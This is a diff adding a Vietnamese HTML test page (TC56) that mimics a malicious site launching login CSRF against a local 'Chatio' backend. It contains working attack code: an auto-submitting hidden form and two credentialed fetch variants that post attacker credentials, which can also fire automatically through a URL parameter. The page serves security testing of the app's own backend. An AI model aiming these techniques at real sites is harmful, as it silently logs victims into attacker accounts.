@@ -1,0 +1,106 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8">
+  <title>TC56 – Trang tấn công login CSRF (chỉ dùng để kiểm thử)</title>
+  <style>
+    body { font: 15px/1.5 system-ui, sans-serif; max-width: 760px; margin: 2rem auto; padding: 0 1rem; }
+    code, pre { background: #f2f2f2; padding: .1rem .3rem; border-radius: 4px; }
+    pre { padding: .6rem; white-space: pre-wrap; }
+    button { margin: .3rem .3rem .3rem 0; padding: .4rem .8rem; }
+  </style>
+</head>
+<body>
+  <h1>TC56 – Trang web khác gửi yêu cầu đăng nhập</h1>
+  <p>
+    Trang này mô phỏng một website độc hại. Nó cố đăng nhập vào Chatio bằng tài khoản
+    của kẻ tấn công, để nạn nhân bị đăng nhập vào tài khoản đó mà không biết (login CSRF).
+    Phải mở trang từ một <b>site khác</b> với backend, ví dụ <code>http://127.0.0.1:8081</code>
+    khi backend chạy ở <code>http://localhost:3000</code>.
+  </p>
+  <p>
+    Đích: <code id="target"></code><br>
+    Tài khoản thử: <code id="creds"></code>
+  </p>
+
+  <button id="btn-form">1. Form HTML tự submit (urlencoded)</button>
+  <button id="btn-cors">2. fetch JSON có cookie (cors)</button>
+  <button id="btn-nocors">3. fetch text/plain (no-cors)</button>
+
+  <h2>Kết quả</h2>
+  <pre id="log">(chưa chạy)</pre>
+
+  <form id="evil-form" method="POST" style="display:none">
+    <input name="username"><input name="password">
+  </form>
+
+  <script>
+    const params = new URLSearchParams(location.search);
+    const target = params.get('target') || 'http://localhost:3000/api/auth/login';
+    const username = params.get('u') || 'attacker';
+    const password = params.get('p') || 'attacker-password-123';
+    document.getElementById('target').textContent = target;
+    document.getElementById('creds').textContent = `${username} / ${'*'.repeat(password.length)}`;
+
+    const log = (line) => {
+      const el = document.getElementById('log');
+      el.textContent = (el.textContent === '(chưa chạy)' ? '' : el.textContent + '\n') + line;
+      window.__tc56 = (window.__tc56 || []).concat(line);
+    };
+
+    // 1. Cách tấn công kinh điển: form ẩn tự submit. Trình duyệt điều hướng sang backend
+    //    và hiển thị phản hồi của backend.
+    const submitForm = () => {
+      const form = document.getElementById('evil-form');
+      form.action = target;
+      form.username.value = username;
+      form.password.value = password;
+      form.submit();
+    };
+
+    // 2. fetch JSON kèm cookie: trình duyệt gửi preflight OPTIONS; backend không bật CORS
+    //    nên request thật không bao giờ được gửi.
+    const corsFetch = async () => {
+      try {
+        const res = await fetch(target, {
+          method: 'POST',
+          mode: 'cors',
+          credentials: 'include',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password }),
+        });
+        log(`2. cors: HTTP ${res.status}`);
+      } catch (error) {
+        log(`2. cors: trình duyệt chặn (${error.name}: ${error.message})`);
+      }
+    };
+
+    // 3. fetch no-cors text/plain: không cần preflight nên request tới được server,
+    //    nhưng trang tấn công không đọc được phản hồi (opaque).
+    const noCorsFetch = async () => {
+      try {
+        const res = await fetch(target, {
+          method: 'POST',
+          mode: 'no-cors',
+          credentials: 'include',
+          headers: { 'Content-Type': 'text/plain' },
+          body: JSON.stringify({ username, password }),
+        });
+        log(`3. no-cors: đã gửi, phản hồi opaque (type=${res.type}); xem kết quả ở log backend/CSDL`);
+      } catch (error) {
+        log(`3. no-cors: lỗi ${error.name}: ${error.message}`);
+      }
+    };
+
+    document.getElementById('btn-form').onclick = submitForm;
+    document.getElementById('btn-cors').onclick = corsFetch;
+    document.getElementById('btn-nocors').onclick = noCorsFetch;
+
+    // Dùng cho kiểm thử tự động: ?auto=form | cors | nocors
+    const auto = params.get('auto');
+    if (auto === 'form') submitForm();
+    if (auto === 'cors') corsFetch().then(() => (window.__done = true));
+    if (auto === 'nocors') noCorsFetch().then(() => (window.__done = true));
+  </script>
+</body>
+</html>
